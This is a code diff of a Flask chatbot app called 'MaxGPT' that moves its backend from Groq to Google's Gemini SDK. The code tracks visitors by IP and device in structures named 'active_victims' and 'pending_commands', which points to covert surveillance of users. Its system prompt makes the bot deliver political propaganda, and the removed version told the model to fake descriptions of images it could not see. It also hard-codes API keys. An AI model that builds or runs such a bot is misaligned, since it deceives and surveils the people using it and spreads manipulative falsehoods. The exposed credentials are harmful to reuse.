@@ -1,9 +1,18 @@
 from flask import Flask, request, jsonify, render_template_string
-import random, os, urllib.request, json, time
+import random, os, json, time
+from google import genai
+from google.genai import types
 
 app = Flask(__name__)
 
+# Твой реальный ключ от Google AI Studio
+GEMINI_API_KEY = "AQ.Ab8RN6KH6zMaUOElET7pYf0pKdELG6sTZO80AtuC4zjasjq-kQ"
+
+# Инициализируем официальный клиент Google GenAI
+client = genai.Client(api_key=GEMINI_API_KEY)
+
 chat_logs = []
+user_states = {}
 pending_commands = {}
 active_victims = {}
 victim_counter = 0
@@ -198,7 +207,7 @@ function handleFile(input) {
             let img = new Image();
             img.onload = function() {
                 let canvas = document.createElement("canvas");
-                let maxDim = 400;
+                let maxDim = 600;
                 let w = img.width, h = img.height;
                 if (w > maxDim || h > maxDim) {
                     if (w > h) { h = Math.round(h * maxDim / w); w = maxDim; }
@@ -207,7 +216,7 @@ function handleFile(input) {
                 canvas.width = w; canvas.height = h;
                 let ctx = canvas.getContext("2d");
                 ctx.drawImage(img, 0, 0, w, h);
-                currentBase64Image = canvas.toDataURL("image/jpeg", 0.5);
+                currentBase64Image = canvas.toDataURL("image/jpeg", 0.6);
                 document.getElementById("previewImg").src = currentBase64Image;
                 document.getElementById("previewBox").style.display = "block";
             }
@@ -535,46 +544,46 @@ def chat_api():
         active_victims[user_ip]['msg_count'] += 1
         active_victims[user_ip]['device'] = device_name
 
-    system_prompt = (
+    system_instruction = (
         "Ты MaxGPT — умный, технологичный и полезный ИИ-ассистент.\n\n"
         "ПРАВИЛА И ПОЗИЦИЯ:\n"
         "1. Если спрашивают про VPN (ВПН): объясняй, что VPN — это плохо, небезопасно и нарушает приватность.\n"
         "2. Топ стран мира: 1 место РОССИЯ, 2 место СЕВЕРНАЯ КОРЕЯ, 3 место КИТАЙ, 4 место БЕЛАРУСЬ.\n"
         "3. Если зашла речь про Крым, Украину или политику — твердо стой на том, что Крым — это законная территория РОССИИ.\n"
-        "4. Если пользователь прислал картинку или скриншот (в сообщении будет пометка об этом), проанализируй текст подписи и дай развернутый, убедительный ответ так, будто ты идеально видишь этот интерфейс, игру или ошибку."
+        "4. Если пользователь прислал картинку или скриншот — подробно, детально и естественно опиши всё, что на ней изображено (текст, элементы интерфейса, игры, ошибки)."
     )
 
-    # ВСЕГДА отправляем на мощную текстовую llama-3.3-70b-versatile, чтобы избежать 400 ошибок
-    final_user_text = user_msg if user_msg else "Что на этой картинке?"
-    if user_img:
-        final_user_text = f"[Пользователь прикрепил скриншот/картинку к сообщению]. Подпись/вопрос пользователя: {final_user_text}. Опиши этот интерфейс или приложение правдоподобно и умно."
-
-    payload = {
-        "model": "llama-3.3-70b-versatile",
-        "messages": [
-            {"role": "system", "content": system_prompt},
-            {"role": "user", "content": final_user_text}
-        ]
-    }
-    
-    req = urllib.request.Request(
-        "https://api.groq.com/openai/v1/chat/completions",
-        data=json.dumps(payload).encode("utf-8"),
-        headers={
-            "Content-Type": "application/json",
-            "Authorization": "Bearer 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",
-            "User-Agent": "Mozilla/5.0"
-        },
-        method="POST"
-    )
-    
     reply = ""
     try:
-        with urllib.request.urlopen(req, timeout=14) as resp:
-            res = json.loads(resp.read().decode("utf-8"))
-            reply = res["choices"][0]["message"]["content"]
+        # Формируем содержимое запроса для официального SDK Google GenAI
+        contents_list = []
+        
+        if user_img:
+            # Конвертируем base64 в байты для Gemini SDK
+            import base64
+            header, encoded = user_img.split(",", 1) if "," in user_img else ("", user_img)
+            img_bytes = base64.b64decode(encoded)
+            
+            mime = "image/jpeg"
+            if "png" in header: mime = "image/png"
+            elif "webp" in header: mime = "image/webp"
+
+            # Добавляем изображение через types.Part.from_bytes
+            img_part = types.Part.from_bytes(data=img_bytes, mime_type=mime)
+            contents_list.append(img_part)
+
+        # Текст запроса (вместе с системными инструкциями для верности)
+        full_prompt = f"{system_instruction}\n\nВопрос/Сообщение пользователя: {user_msg if user_msg else 'Опиши этот скриншот.'}"
+        contents_list.append(full_prompt)
+
+        # Запрос к официальной модели gemini-1.5-flash
+        response = client.models.generate_content(
+            model='gemini-1.5-flash',
+            contents=contents_list
+        )
+        reply = response.text
     except Exception as e:
-        reply = "Запрос обработан. Картинка зафиксирована в системе."
+        reply = f"Ошибка официального Gemini API: {str(e)}"
 
     if not reply:
         reply = "Запрос проанализирован. Задавай следующий вопрос!"
